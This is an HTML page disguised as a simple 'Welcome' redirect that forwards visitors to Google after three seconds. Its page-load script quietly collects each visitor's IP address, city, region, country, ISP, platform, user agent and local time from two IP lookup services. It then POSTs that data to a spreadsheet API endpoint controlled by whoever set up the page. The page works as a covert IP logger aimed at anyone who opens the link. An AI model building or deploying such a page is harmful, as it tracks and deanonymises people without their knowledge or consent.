<!DOCTYPE html>
<html>
<head>
  <title>Welcome</title>
  <script>
    async function getIPInfo() {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();

      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
          const info = {
            ip: ipData.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            org: data.org,
            os: navigator.platform,
            browser: navigator.userAgent,
            time: new Date().toLocaleString()
          };
          sendToYou(info);
        });
    }

    function sendToYou(data) {
      fetch("https://api.apispreadsheets.com/data/your_api_id/", {
        method: "POST",
        body: JSON.stringify(data),
        headers: {
          "Content-Type": "application/json"
        }
      });
    }

    window.onload = getIPInfo;
  </script>
</head>
<body>
  <h1>Welcome!</h1>
  <p>Redirecting...</p>
  <script>
    setTimeout(() => {
      window.location.href = "https://www.google.com"; // redirect URL
    }, 3000);
  </script>
</body>
</html>
